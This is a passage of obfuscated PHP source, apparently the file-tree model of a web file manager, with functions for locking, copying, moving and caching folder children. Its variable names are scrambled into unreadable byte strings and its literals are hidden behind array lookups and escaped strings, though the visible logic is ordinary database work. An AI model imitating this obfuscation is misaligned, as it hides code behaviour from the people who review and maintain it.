$_SERVER[Ó¡Ÿ§‚]; $—Ûùòº¼ = $óƒÎˆ­ . $®‘›¼üà[10] . $¢úŞİ¯¦; CacheLock::setErrorMsg($®‘›¼üà[378]); if (!isset($this->_lockTimeStart[$—Ûùòº¼])) { return; } $ÛÆÍ‡ï = timeFloat() - $this->_lockTimeStart[$—Ûùòº¼]; unset($this->_lockTimeStart[$—Ûùòº¼]); if ($ÛÆÍ‡ï > 0.5) { unset(self::$cacheSourceInfo[$®‘›¼üà[469] . $¢úŞİ¯¦]); } $œ¬ú­Ñ = $this->sourceInfo($¢úŞİ¯¦); if (!$œ¬ú­Ñ) { show_json(LNG($®‘›¼üà[105]), !1); } } private function _lockParent($ƒ–äÖ, $ôœ¸Çè·, $Í©ÑòĞÕ) { if (!$this->autoLockSet) { return; } $…’ ŸÎ = $this->sourceInfo($ƒ–äÖ); if (!is_array($…’ ŸÎ)) { return; } $˜Ÿã´‰¶ = array_reverse($this->parentLevelArray($…’ ŸÎ[$_SERVER[Ó¡Ÿ§‚][520]])); foreach ($˜Ÿã´‰¶ as $Ä‰°èÈ) { $this->_lockEvent($Ä‰°èÈ, $ôœ¸Çè·, $Í©ÑòĞÕ); } } private function _lockEvent($ÎîÂ€Éª, $Ù¼Ææ„õ, $ßò›Ûª¸) { $ÕÁÖÄôñ =& $_SERVER[Ó¡Ÿ§‚]; if (!$this->autoLockSet) { return; } foreach ($Ù¼Ææ„õ as $£È‰¸°) { $¾µ—¾î™ = $£È‰¸° . $ÕÁÖÄôñ[10] . $ÎîÂ€Éª; if ($ßò›Ûª¸ && CacheLock::lockGet($ÕÁÖÄôñ[565] . $¾µ—¾î™)) { continue; } $this->_lockKey($¾µ—¾î™, $ßò›Ûª¸); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($²µĞØ÷, $Õ¦õ¢—’ = 1) { $µúû–Àƒ = $_SERVER[Ó¡Ÿ§‚][565] . md5($²µĞØ÷); if ($Õ¦õ¢—’) { if (isset(self::$_lockItemArr[$µúû–Àƒ])) { return; } self::$_lockItemArr[$µúû–Àƒ] = 1; CacheLock::lock($µúû–Àƒ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$µúû–Àƒ])) { return; } unset(self::$_lockItemArr[$µúû–Àƒ]); CacheLock::unlock($µúû–Àƒ); } } public function isParentOf($Ì¡ø¸øÚ, $ÙÕåñãŒ) { $ß˜Êúöã =& $_SERVER[Ó¡Ÿ§‚]; $—µğ˜ßŞ = $this->sourceInfo($Ì¡ø¸øÚ); $»Áï´ = $this->sourceInfo($ÙÕåñãŒ); $å¾¼±–Ù = $—µğ˜ßŞ[$ß˜Êúöã[520]] . $—µğ˜ßŞ[$ß˜Êúöã[411]] . $ß˜Êúöã[50]; $¯çñ’×£ = $»Áï´[$ß˜Êúöã[520]] . $»Áï´[$ß˜Êúöã[411]] . $ß˜Êúöã[50]; $£¼à÷µ¢ = strpos($¯çñ’×£, $å¾¼±–Ù) === 0; return $£¼à÷µ¢; } private $targetIsDelete = 0; public function copy($¿‚²€÷Õ, $—İšŠô, $º–ŞÏ ô = REPEAT_REPLACE, $„Û—„©” = '') { $¶í° ûµ =& $_SERVER[Ó¡Ÿ§‚]; $¿î•Íé = $this->sourceInfo($¿‚²€÷Õ); $ëšÔŞ¹ˆ = $this->sourceInfo($—İšŠô); if (!$¿î•Íé || !$ëšÔŞ¹ˆ || $ëšÔŞ¹ˆ[$¶í° ûµ[419]] != $¶í° ûµ[88]) { return !1; } if ($this->isParentOf($¿‚²€÷Õ, $—İšŠô)) { return !1; } $ñ‹«¼ = $„Û—„©” ? $„Û—„©” : $¿î•Íé[$¶í° ûµ[32]]; $this->lockCopyStart($¿‚²€÷Õ); $this->lockWriteStart($—İšŠô, $ñ‹«¼); $Íƒ ­Ç» = array($¶í° ûµ[566] => array(), $¶í° ûµ[567] => array(), $¶í° ûµ[568] => array()); $this->targetIsDelete = intval($¿î•Íé[$¶í° ûµ[440]]); $¼—´¹ë³ = $this->fileNameExistCache($—İšŠô, $¿î•Íé[$¶í° ûµ[32]]); $æ“†¢ = $this->_copy($¿‚²€÷Õ, $—İšŠô, $º–ŞÏ ô, $Íƒ ­Ç», !0, $„Û—„©”); $this->_childrenListClear(); $this->lockCopyEnd($¿‚²€÷Õ); $this->lockWriteEnd($—İšŠô, $ñ‹«¼); if ($¿î•Íé[$¶í° ûµ[419]] == $¶í° ûµ[88] && $¼—´¹ë³ == $æ“†¢) { $this->folderSizeResetChildren($¼—´¹ë³); } Model($¶í° ûµ[569])->addAll($Íƒ ­Ç»[$¶í° ûµ[567]], array(), !0); if ($¼—´¹ë³ != $æ“†¢ || $¿î•Íé[$¶í° ûµ[419]] == $¶í° ûµ[88]) { Model($¶í° ûµ[570])->eventCopy($æ“†¢); } $this->saveAll($Íƒ ­Ç»[$¶í° ûµ[568]]); Model($¶í° ûµ[200])->linkAdd($Íƒ ­Ç»[$¶í° ûµ[566]]); $this->folderSizeReset($—İšŠô); $this->updateModifyTime($—İšŠô); return $æ“†¢; } private function _copy($Ú¸Ÿ»åÓ, $¯©Â›„î, $÷ÉÖª½Ø, &$˜îÊÉçØ, $×ìĞ€ì, $‰€öèü = '') { $€ÒìÉ¥ =& $_SERVER[Ó¡Ÿ§‚]; $¡¼êì = $this->sourceInfoCache($Ú¸Ÿ»åÓ); $öö¨¶•ï = $¡¼êì[$€ÒìÉ¥[419]] == $€ÒìÉ¥[88]; $Õ„çûœ = $‰€öèü ? $‰€öèü : $¡¼êì[$€ÒìÉ¥[32]]; $êÇÄÜÌ™ = $this->fileNameExistCache($¯©Â›„î, $Õ„çûœ); if ($×ìĞ€ì) { $this->_childrenAllMake($Ú¸Ÿ»åÓ); if ($öö¨¶•ï && $êÇÄÜÌ™) { $this->_childrenAllMake($êÇÄÜÌ™); } } if (!$êÇÄÜÌ™) { return $this->_copyCreate($Ú¸Ÿ»åÓ, $¯©Â›„î, $Õ„çûœ, $˜îÊÉçØ); } $‡ğğâ = $êÇÄÜÌ™; if ($öö¨¶•ï) { if ($÷ÉÖª½Ø == REPEAT_RENAME_FOLDER) { $Õ„çûœ = $this->fileNameAutoCache($¯©Â›„î, $Õ„çûœ, $÷ÉÖª½Ø, $öö¨¶•ï); $‡ğğâ = $this->_copyCreate($Ú¸Ÿ»åÓ, $¯©Â›„î, $Õ„çûœ, $˜îÊÉçØ); } else { $ï¶ùÊµ„ = $this->_childrenList($Ú¸Ÿ»åÓ); foreach ($ï¶ùÊµ„ as $éšÀÎÙ) { $this->_copy($éšÀÎÙ[$€ÒìÉ¥[411]], $êÇÄÜÌ™, $÷ÉÖª½Ø, $˜îÊÉçØ, !1); } } } else { if ($÷ÉÖª½Ø == REPEAT_RENAME || $÷ÉÖª½Ø == REPEAT_RENAME_FOLDER) { $Õ„çûœ = $this->fileNameAutoCache($¯©Â›„î, $Õ„çûœ, $÷ÉÖª½Ø, $öö¨¶•ï); $‡ğğâ = $this->_copyCreate($Ú¸Ÿ»åÓ, $¯©Â›„î, $Õ„çûœ, $˜îÊÉçØ); } else { if ($÷ÉÖª½Ø == REPEAT_REPLACE) { $ŸÂŸŠØŠ = $this->sourceInfoCache($êÇÄÜÌ™); $á“ùäİş = $this->fileHistory($ŸÂŸŠØŠ, $¡¼êì[$€ÒìÉ¥[477]], $¡¼êì[$€ÒìÉ¥[76]]); if ($á“ùäİş) { $˜îÊÉçØ[$€ÒìÉ¥[566]][] = $¡¼êì[$€ÒìÉ¥[477]]; } } else { if ($÷ÉÖª½Ø == REPEAT_SKIP) { } } } Hook::trigger($€ÒìÉ¥[571], array($€ÒìÉ¥[572], $¡¼êì, 0)); } return $‡ğğâ; } private function _copyCreate($Ô¿ÎÎ, $òùÃüÙË, $îøç´÷‰, &$ìåøİ¨ı) { $£ÔõÑ¦„ =& $_SERVER[Ó¡Ÿ§‚]; $†ï‚‹² = $this->sourceInfoCache($Ô¿ÎÎ); $¿şË¿Àê = $this->sourceInfoCache($òùÃüÙË); $“åˆ™Àƒ = $this->_makeItemData($†ï‚‹², $¿şË¿Àê, $îøç´÷‰); Hook::trigger($£ÔõÑ¦„[573], $“åˆ™Àƒ); Hook::trigger($£ÔõÑ¦„[574], array($£ÔõÑ¦„[575], $“åˆ™Àƒ, 0)); $Üü¦é×ù = $this->add($“åˆ™Àƒ); $îÑĞĞØ = array($£ÔõÑ¦„[411] => $Üü¦é×ù, $£ÔõÑ¦„[32] => $îøç´÷‰); $this->_copyApplyMeta($îÑĞĞØ, $ìåøİ¨ı); if ($†ï‚‹²[$£ÔõÑ¦„[419]] != $£ÔõÑ¦„[88]) { $ìåøİ¨ı[$£ÔõÑ¦„[566]][] = $†ï‚‹²[$£ÔõÑ¦„[477]]; return $Üü¦é×ù; } $”í¦ùíÅ = array(); $ËºÀÏÀ… = array(); $this->_childrenListAll($Ô¿ÎÎ, $”í¦ùíÅ); $ÛÁãõ†å = count($”í¦ùíÅ); if ($ÛÁãõ†å == 0) { return $Üü¦é×ù; } $Ïõ·Åö = $this->sourceInfo($Üü¦é×ù); foreach ($”í¦ùíÅ as $•›øü™¶) { $†ğŒßæ€ = $this->_makeItemData($•›øü™¶, $Ïõ·Åö, $•›øü™¶[$£ÔõÑ¦„[32]]); $†ğŒßæ€[$£ÔõÑ¦„[520]] = $•›øü™¶[$£ÔõÑ¦„[520]]; $ËºÀÏÀ…[] = $†ğŒßæ€; } $this->chunkEventSet($£ÔõÑ¦„[576], array($£ÔõÑ¦„[577], $“åˆ™Àƒ, $ÛÁãõ†å)); $this->addAll($ËºÀÏÀ…, array(), !1); $§¢Ü‹ = $this->where(array($£ÔõÑ¦„[441] => $Üü¦é×ù))->select(); $‰ÙñÌÙ± = $this->_childrenMakeRelation($”í¦ùíÅ, $§¢Ü‹); $‰ÙñÌÙ±[$Ô¿ÎÎ] = $Üü¦é×ù; $û×ÛÜ‚ = array(); $éÌÇæ×È = array(); foreach ($§¢Ü‹ as $•›øü™¶) { $ÔÚù€ï = $•›øü™¶[$£ÔõÑ¦„[411]]; $Íùœ½²Ó = $this->_childrenMatch($‰ÙñÌÙ±, $•›øü™¶, $Ïõ·Åö); $û×ÛÜ‚[] = array($£ÔõÑ¦„[411], $ÔÚù€ï, $£ÔõÑ¦„[441], $Íùœ½²Ó[$£ÔõÑ¦„[441]]); $éÌÇæ×È[] = array($£ÔõÑ¦„[411], $ÔÚù€ï, $£ÔõÑ¦„[520], $Íùœ½²Ó[$£ÔõÑ¦„[520]]); $this->_copyApplyMeta($•›øü™¶, $ìåøİ¨ı); if ($•›øü™¶[$£ÔõÑ¦„[419]] != $£ÔõÑ¦„[88]) { $ìåøİ¨ı[$£ÔõÑ¦„[566]][] = $•›øü™¶[$£ÔõÑ¦„[477]]; } } $this->chunkEventSet($£ÔõÑ¦„[578], array($£ÔõÑ¦„[579], $“åˆ™Àƒ, $ÛÁãõ†å)); $this->saveAll($û×ÛÜ‚); $this->chunkEventSet($£ÔõÑ¦„[580], array($£ÔõÑ¦„[581], $“åˆ™Àƒ, $ÛÁãõ†å)); $this->saveAll($éÌÇæ×È); return $Üü¦é×ù; } private function _childrenMakeRelation($Ôó³«Ïç, $¤Ìº¢º) { $¥ìóè£ş =& $_SERVER[Ó¡Ÿ§‚]; $Ó¸³ˆó = array(); $ı¸Öƒ‰ş = array(); foreach ($Ôó³«Ïç as $÷¹…ì²Õ) { $÷÷Ó™”ˆ = $÷¹…ì²Õ[$¥ìóè£ş[32]] . $¥ìóè£ş[8] . $÷¹…ì²Õ[$¥ìóè£ş[520]]; $Ó¸³ˆó[$÷÷Ó™”ˆ] = $÷¹…ì²Õ[$¥ìóè£ş[411]]; } foreach ($¤Ìº¢º as $÷¹…ì²Õ) { $÷÷Ó™”ˆ = $÷¹…ì²Õ[$¥ìóè£ş[32]] . $¥ìóè£ş[8] . $÷¹…ì²Õ[$¥ìóè£ş[520]]; $÷×ã¿ì = $Ó¸³ˆó[$÷÷Ó™”ˆ]; $ı¸Öƒ‰ş[$÷×ã¿ì] = $÷¹…ì²Õ[$¥ìóè£ş[411]]; } return $ı¸Öƒ‰ş; } private function _childrenMatch($‚ÅŠ‰‘À, $é¸•™Åª, $Ñ‚Ï—†Ë) { $‰šÛó =& $_SERVER[Ó¡Ÿ§‚]; $ºğ³å”ª = $Ñ‚Ï—†Ë[$‰šÛó[520]]; $ÍÊÅ„í¥ = $this->parentLevelArray($é¸•™Åª[$‰šÛó[520]]); foreach ($ÍÊÅ„í¥ as $ğŠë½Ì) { if (isset($‚ÅŠ‰‘À[$ğŠë½Ì])) { $ºğ³å”ª .= $‚ÅŠ‰‘À[$ğŠë½Ì] . $‰šÛó[582]; } } $ºğ³å”ª = rtrim($ºğ³å”ª, $‰šÛó[50]) . $‰šÛó[50]; $Ğµø•Í„ = $this->parentLevelArray($ºğ³å”ª); $ıéÏı§‘ = $Ğµø•Í„[count($Ğµø•Í„) - 1]; return array($‰šÛó[441] => $ıéÏı§‘, $‰šÛó[520] => $ºğ³å”ª); } private function _makeItemData($àíò„íä, $ñ«Ö¼ÑÛ, $¼Şø“í») { $‘µÃÆª =& $_SERVER[Ó¡Ÿ§‚]; $Ò˜œ·š¹ = array($‘µÃÆª[583] => $àíò„íä[$‘µÃÆª[419]], $‘µÃÆª[429] => $¼Şø“í», $‘µÃÆª[584] => $àíò„íä[$‘µÃÆª[421]] ? $àíò„íä[$‘µÃÆª[421]] : $‘µÃÆª[12], $‘µÃÆª[478] => $àíò„íä[$‘µÃÆª[477]] ? $àíò„íä[$‘µÃÆª[477]] : 0, $‘µÃÆª[554] => $àíò„íä[$‘µÃÆª[76]] ? $àíò„íä[$‘µÃÆª[76]] : 0, $‘µÃÆª[585] => intval($ñ«Ö¼ÑÛ[$‘µÃÆª[420]]), $‘µÃÆª[586] => intval($ñ«Ö¼ÑÛ[$‘µÃÆª[505]]), $‘µÃÆª[587] => intval(USER_ID), $‘µÃÆª[588] => intval(USER_ID), $‘µÃÆª[410] => intval($ñ«Ö¼ÑÛ[$‘µÃÆª[411]]), $‘µÃÆª[589] => $ñ«Ö¼ÑÛ[$‘µÃÆª[520]] . $ñ«Ö¼ÑÛ[$‘µÃÆª[411]] . $‘µÃÆª[50], $‘µÃÆª[433] => $àíò„íä[$‘µÃÆª[85]] ? $àíò„íä[$‘µÃÆª[85]] : time(), $‘µÃÆª[439] => 0, $‘µÃÆª[590] => $‘µÃÆª[12]); return $Ò˜œ·š¹; } private function _copyApplyMeta($ùÀßÒ½, &$Ù­Ä³ê) { $½¡¤ÖÎ =& $_SERVER[Ó¡Ÿ§‚]; $¸µœ’Äª = $ùÀßÒ½[$½¡¤ÖÎ[411]]; $¼ô±É—Ê = $ùÀßÒ½[$½¡¤ÖÎ[32]]; if (!isset($ùÀßÒ½[$½¡¤ÖÎ[591]]) || !$ùÀßÒ½[$½¡¤ÖÎ[591]] || $ùÀßÒ½[$½¡¤ÖÎ[591]] == $½¡¤ÖÎ[198]) { $Ù­Ä³ê[$½¡¤ÖÎ[568]][] = array($½¡¤ÖÎ[411], $¸µœ’Äª, $½¡¤ÖÎ[591], short_id($¸µœ’Äª)); } if (Input::check($¼ô±É—Ê, $½¡¤ÖÎ[592])) { $Ù­Ä³ê[$½¡¤ÖÎ[567]][] = array($½¡¤ÖÎ[411] => $¸µœ’Äª, $½¡¤ÖÎ[94] => $½¡¤ÖÎ[474], $½¡¤ÖÎ[374] => str_replace($½¡¤ÖÎ[53], $½¡¤ÖÎ[12], Pinyin::get($¼ô±É—Ê))); $Ù­Ä³ê[$½¡¤ÖÎ[567]][] = array($½¡¤ÖÎ[411] => $¸µœ’Äª, $½¡¤ÖÎ[94] => $½¡¤ÖÎ[473], $½¡¤ÖÎ[374] => Pinyin::get($¼ô±É—Ê, $½¡¤ÖÎ[593])); } $Ù­Ä³ê[$½¡¤ÖÎ[567]][] = array($½¡¤ÖÎ[411] => $¸µœ’Äª, $½¡¤ÖÎ[94] => $½¡¤ÖÎ[453], $½¡¤ÖÎ[374] => KodSort::makeStr($¼ô±É—Ê)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($£ñàóª) { $áñá»ß =& $_SERVER[Ó¡Ÿ§‚]; $áÒéÅäè = $this->sourceInfo($£ñàóª); $¤ôÃ£´÷ = $áñá»ß[594]; $˜ïÙëàÂ = array($áñá»ß[520] => array($áñá»ß[549], $áÒéÅäè[$áñá»ß[520]] . $£ñàóª . $áñá»ß[550]), $áñá»ß[440] => $this->targetIsDelete); $ß¶©óú÷ = $this->field($¤ôÃ£´÷)->where($˜ïÙëàÂ)->select(); if (!$ß¶©óú÷) { return; } $ß¶©óú÷ = array_to_keyvalue($ß¶©óú÷, $áñá»ß[411]); foreach ($ß¶©óú÷ as $€Ò×Ï£) { $„Ğ’º’ = $€Ò×Ï£[$áñá»ß[441]]; $£ñàóª = $€Ò×Ï£[$áñá»ß[411]]; if (!isset($this->_childrenListCache[$£ñàóª]) && $€Ò×Ï£[$áñá»ß[419]] == $áñá»ß[88]) { $this->_childrenListCache[$£ñàóª] = array(); } if (!isset($this->_childrenListCache[$„Ğ’º’])) { $this->_childrenListCache[$„Ğ’º’] = array(); } $this->_childrenListCache[$„Ğ’º’][$£ñàóª] = $€Ò×Ï£; $this->_childrenItemCache[$£ñàóª] = $€Ò×Ï£; } } private function _childrenListAll($ÔÍ¹ª‹ˆ, &$¨®àµùı) { $ó€Û•ß— =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($this->_childrenListCache[$ÔÍ¹ª‹ˆ])) { return; } $×Õ™®¡ö = $this->_childrenListCache[$ÔÍ¹ª‹ˆ]; foreach ($×Õ™®¡ö as $èˆŠ‘äÏ => $íîÂÃ»Ç) { $¨®àµùı[$èˆŠ‘äÏ] = $íîÂÃ»Ç; if ($íîÂÃ»Ç[$ó€Û•ß—[419]] == $ó€Û•ß—[88]) { $this->_childrenListAll($èˆŠ‘äÏ, $¨®àµùı); } } } private function sourceInfoCache($îşğ¥‹·) { if (isset($this->_childrenItemCache[$îşğ¥‹·])) { return $this->_childrenItemCache[$îşğ¥‹·]; } return $this->sourceInfo($îşğ¥‹·); } private function _childrenList($Ÿ‡ÑŞ„”) { if (isset($this->_childrenListCache[$Ÿ‡ÑŞ„”])) { return $this->_childrenListCache[$Ÿ‡ÑŞ„”]; } return $this->_childrenListSelect($Ÿ‡ÑŞ„”); } private function _childrenListSelect($…ÊáÛÈ) { $“°ËÈó« =& $_SERVER[Ó¡Ÿ§‚]; $ÎØ­øñö = array($“°ËÈó«[441] => $…ÊáÛÈ, $“°ËÈó«[440] => $this->targetIsDelete); $ô×¹ †– = $this->where($ÎØ­øñö)->select(); $ô×¹ †– = $ô×¹ †– ? $ô×¹ †– : array(); $’“—å„õ = array_to_keyvalue($ô×¹ †–, $“°ËÈó«[411]); $this->_childrenListCache[$…ÊáÛÈ] = $’“—å„õ; foreach ($’“—å„õ as $…ÊáÛÈ => $½¬âƒ•) { $this->_childrenItemCache[$…ÊáÛÈ] = $½¬âƒ•; } return $’“—å„õ; } private function fileNameExistCache($öÚÉ¹·“, $Õ´Ûµ˜ ) { $õà‘¾Šé =& $_SERVER[Ó¡Ÿ§‚]; $Õ´Ûµ˜  = strtolower($Õ´Ûµ˜ ); $£šøíğ = $this->_childrenList($öÚÉ¹·“); foreach ($£šøíğ as $±¥¥ÌĞÌ) { if ($Õ´Ûµ˜  == strtolower($±¥¥ÌĞÌ[$õà‘¾Šé[32]])) { return $±¥¥ÌĞÌ[$õà‘¾Šé[411]]; } } return !1; } private function fileNameAutoCache($·Ç¼¦éğ, $ÊêôÑå, $ıã¸Íƒ°, $Ş¸ÏäÎ®) { $ëÖ»Æªù =& $_SERVER[Ó¡Ÿ§‚]; $Ê‚„¸ıè = $this->_childrenList($·Ç¼¦éğ); $‡ï”ğãù = array_to_keyvalue($Ê‚„¸ıè, $ëÖ»Æªù[12], $ëÖ»Æªù[32]); return $this->fileNameAutoGet($‡ï”ğãù, $ÊêôÑå, $ıã¸Íƒ°, $Ş¸ÏäÎ®); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($•ÛßÒãù, $áŸ¯Û¯†, $¨ìØâÁ» = REPEAT_REPLACE, $™æØ˜¤± = '') { $Äşâ®µ =& $_SERVER[Ó¡Ÿ§‚]; $æÙ†·éä = $this->sourceInfo($•ÛßÒãù); $ß¾·û×£ = $this->sourceInfo($áŸ¯Û¯†); if ($æÙ†·éä[$Äşâ®µ[441]] == $ß¾·û×£[$Äşâ®µ[411]]) { if ($æÙ†·éä[$Äşâ®µ[440]] == $Äşâ®µ[88]) { Model($Äşâ®µ[438])->restore(array($•ÛßÒãù)); } if (!$™æØ˜¤± || $™æØ˜¤± == $æÙ†·éä[$Äşâ®µ[32]]) { return $•ÛßÒãù; } } $’Ù¦“–ş = $this->pathInfoMore($•ÛßÒãù); if ($this->isParentOf($•ÛßÒãù, $áŸ¯Û¯†)) { return !1; } if (!$æÙ†·éä || !$ß¾·û×£ || $ß¾·û×£[$Äşâ®µ[419]] != $Äşâ®µ[88]) { return !1; } Hook::trigger($Äşâ®µ[595], $’Ù¦“–ş); $this->targetIsDelete = intval($æÙ†·éä[$Äşâ®µ[440]]); if ($æÙ†·éä[$Äşâ®µ[441]] == $áŸ¯Û¯† && $™æØ˜¤± != $æÙ†·éä[$Äşâ®µ[32]]) { $‹Êš”¹ = $this->fileNameExist($áŸ¯Û¯†, $™æØ˜¤±); if ($‹Êš”¹ && $æÙ†·éä[$Äşâ®µ[419]] == $Äşâ®µ[198]) { $œÓ€Ó = $this->sourceInfo($‹Êš”¹); $Ö‚ÏÖ÷ = $this->fileHistory($œÓ€Ó, $æÙ†·éä[$Äşâ®µ[477]], $æÙ†·éä[$Äşâ®µ[76]]); if (!$Ö‚ÏÖ÷) { Model($Äşâ®µ[480])->remove($æÙ†·éä[$Äşâ®µ[477]]); } $this->removeNow($•ÛßÒãù, !1); $this->folderSizeReset($áŸ¯Û¯†); Hook::trigger($Äşâ®µ[596], $’Ù¦“–ş); return $‹Êš”¹; } } $ò¹ß = $™æØ˜¤± ? $™æØ˜¤± : $æÙ†·éä[$Äşâ®µ[32]]; $this->lockMoveStart($•ÛßÒãù); $this->lockWriteStart($áŸ¯Û¯†, $ò¹ß); $€¸‡ÙÍ¾ = array($Äşâ®µ[566] => array(), $Äşâ®µ[597] => !1); $this->clearShare($•ÛßÒãù, $áŸ¯Û¯†); $†Ğ°ğœü = $this->fileNameExistCache($áŸ¯Û¯†, $æÙ†·éä[$Äşâ®µ[32]]); $øÏ£ø²ˆ = $this->_move($•ÛßÒãù, $áŸ¯Û¯†, $¨ìØâÁ», $€¸‡ÙÍ¾, $™æØ˜¤±); $this->sourceCacheClear(); if ($æÙ†·éä[$Äşâ®µ[419]] == $Äşâ®µ[88] && $†Ğ°ğœü) { $this->folderSizeResetChildren($øÏ£ø²ˆ); } Model($Äşâ®µ[200])->linkAdd($€¸‡ÙÍ¾[$Äşâ®µ[566]]); if ($†Ğ°ğœü && $€¸‡ÙÍ¾[$Äşâ®µ[597]]) { $this->removeNow($•ÛßÒãù, !1); } $this->lockMoveEnd($•ÛßÒãù); $this->lockWriteEnd($áŸ¯Û¯†, $ò¹ß); $this->folderSizeReset($æÙ†·éä[$Äşâ®µ[441]]); $this->folderSizeReset($áŸ¯Û¯†); $´ğûàç´ = array($æÙ†·éä[$Äşâ®µ[441]], $áŸ¯Û¯†); if ($æÙ†·éä[$Äşâ®µ[419]] == $Äşâ®µ[88]) { $´ğûàç´[] = $•ÛßÒãù; } $this->updateModifyTime($´ğûàç´); Model($Äşâ®µ[570])->eventMove($•ÛßÒãù, $æÙ†·éä[$Äşâ®µ[441]], $áŸ¯Û¯†); Hook::trigger($Äşâ®µ[596], $’Ù¦“–ş); return $øÏ£ø²ˆ; } private function _move($â·„É¢ï, $÷©‘àÄ‰, $éãª¬õ, &$¿„“£Êè, $âÙ„š¯ê = '') { $’ãåşÖŸ =& $_SERVER[Ó¡Ÿ§‚]; $„ÈÍÆ£á = $this->sourceInfo($â·„É¢ï); $Şšôş = $„ÈÍÆ£á[$’ãåşÖŸ[419]] == $’ãåşÖŸ[88]; $¡Ù¢Œ²ß = $âÙ„š¯ê ? $âÙ„š¯ê : $„ÈÍÆ£á[$’ãåşÖŸ[32]]; $áíë§µâ = $this->fileNameExistCache($÷©‘àÄ‰, $¡Ù¢Œ²ß); $this->lockMoveStart($â·„É¢ï); $this->lockWriteStart($÷©‘àÄ‰, $¡Ù¢Œ²ß); if (!$áíë§µâ) { return $this->_moveForce($â·„É¢ï, $÷©‘àÄ‰, $¡Ù¢Œ²ß); } $›¤²›¨ê = $áíë§µâ; $”»‡Ú¥ = !1; if ($Şšôş) { if ($éãª¬õ == REPEAT_RENAME_FOLDER) { $¡Ù¢Œ²ß = $this->fileNameAuto($÷©‘àÄ‰, $¡Ù¢Œ²ß, $éãª¬õ, $Şšôş); $›¤²›¨ê = $this->_moveForce($â·„É¢ï, $÷©‘àÄ‰, $¡Ù¢Œ²ß); } else { if ($éãª¬õ == REPEAT_RENAME_FOLDER) { $éãª¬õ = REPEAT_RENAME; } $ÌÀñã½â = $this->_childrenListSelect($â·„É¢ï); foreach ($ÌÀñã½â as $ÀË†²„Ü) { $this->_move($ÀË†²„Ü[$’ãåşÖŸ[411]], $áíë§µâ, $éãª¬õ, $¿„“£Êè); } $”»‡Ú¥ = !0; } } else { if ($éãª¬õ == REPEAT_SKIP) { $”»‡Ú¥ = !0; } else { if ($éãª¬õ == REPEAT_RENAME || $éãª¬õ == REPEAT_RENAME_FOLDER) { $¡Ù¢Œ²ß = $this->fileNameAuto($÷©‘àÄ‰, $¡Ù¢Œ²ß, $éãª¬õ, $Şšôş); $›¤²›¨ê = $this->_moveForce($â·„É¢ï, $÷©‘àÄ‰, $¡Ù¢Œ²ß); } else { if ($éãª¬õ == REPEAT_REPLACE) { $Õ¶ä¼ş¡ = $this->sourceInfoCache($áíë§µâ); $Œ³ìÎ¹ = $this->fileHistory($Õ¶ä¼ş¡, $„ÈÍÆ£á[$’ãåşÖŸ[477]], $„ÈÍÆ£á[$’ãåşÖŸ[76]]); $”»‡Ú¥ = !0; if ($Œ³ìÎ¹) { $¿„“£Êè[$’ãåşÖŸ[566]][] = $„ÈÍÆ£á[$’ãåşÖŸ[477]]; } } } } } if ($”»‡Ú¥ && !$¿„“£Êè[$’ãåşÖŸ[597]]) { $¿„“£Êè[$’ãåşÖŸ[597]] = !0; } return $›¤²›¨ê; } private function _moveForce($à¡¦ÍéÆ, $ºŒÁ˜Šü, $À„ß‘äç) { $ë‰÷±Å =& $_SERVER[Ó¡Ÿ§‚]; $Í¡“¼ùÜ = $this->sourceInfo($à¡¦ÍéÆ); $¿Íçô° = $this->sourceInfo($ºŒÁ˜Šü); $’ôƒ«áü = $Í¡“¼ùÜ[$ë‰÷±Å[419]] == $ë‰÷±Å[88]; $ÙñÂ¯í = array($ë‰÷±Å[410] => $¿Íçô°[$ë‰÷±Å[411]], $ë‰÷±Å[589] => $¿Íçô°[$ë‰÷±Å[520]] . $¿Íçô°[$ë‰÷±Å[411]] . $ë‰÷±Å[50], $ë‰÷±Å[585] => $¿Íçô°[$ë‰÷±Å[420]], $ë‰÷±Å[586] => $¿Íçô°[$ë‰÷±Å[505]], $ë‰÷±Å[588] => USER_ID, $ë‰÷±Å[429] => $À„ß‘äç); $øÙ¡ËÍ = $Í¡“¼ùÜ[$ë‰÷±Å[420]] == SourceModel::TYPE_GROUP && $¿Íçô°[$ë‰÷±Å[420]] == SourceModel::TYPE_GROUP && $Í¡“¼ùÜ[$ë‰÷±Å[505]] == $¿Íçô°[$ë‰÷±Å[505]]; if (!$øÙ¡ËÍ && $this->moveClearAuth) { Model($ë‰÷±Å[502])->authClear($à¡¦ÍéÆ); } $Ì®şçŒš = $Í¡“¼ùÜ[$ë‰÷±Å[440]] == $ë‰÷±Å[88] && $¿Íçô°[$ë‰÷±Å[440]] != $ë‰÷±Å[88]; if ($Ì®şçŒš) { $ÙñÂ¯í[$ë‰÷±Å[439]] = 0; } if ($’ôƒ«áü) { $„¦«ô™É = array($ë‰÷±Å[589] => array($ë‰÷±Å[549], $Í¡“¼ùÜ[$ë‰÷±Å[520]] . $Í¡“¼ùÜ[$ë‰÷±Å[411]] . $ë‰÷±Å[550])); $ÀÅƒŞä = $Í¡“¼ùÜ[$ë‰÷±Å[520]] . $Í¡“¼ùÜ[$ë‰÷±Å[411]] . $ë‰÷±Å[50]; $„èÓÄªë = $¿Íçô°[$ë‰÷±Å[520]] . $¿Íçô°[$ë‰÷±Å[411]] . $ë‰÷±Å[50] . $Í¡“¼ùÜ[$ë‰÷±Å[411]] . $ë‰÷±Å[50]; $“öÁùğÕ = array($ë‰÷±Å[589] => array($ë‰÷±Å[598], "\x72\145\160\x6c\x61\x63\145\x28\x70\x61\162\x65\156\164\114\x65\x76\145\154\54\x27{$ÀÅƒŞä}\x27\x2c\47{$„èÓÄªë}\47\x29"), $ë‰÷±Å[585] => $¿Íçô°[$ë‰÷±Å[420]], $ë‰÷±Å[586] => $¿Íçô°[$ë‰÷±Å[505]]); if ($Ì®şçŒš) { $“öÁùğÕ[$ë‰÷±Å[439]] = 0; } $this->where($„¦«ô™É)->data($“öÁùğÕ)->save(); } $this->where(array($ë‰÷±Å[426] => $à¡¦ÍéÆ))->data($ÙñÂ¯í)->save(); return $à¡¦ÍéÆ; } private function clearShare($ç”úÒû, $€ë†Øô) { $’²Ó˜»Ì =& $_SERVER[Ó¡Ÿ§‚]; $ï¼Ş²¸í = 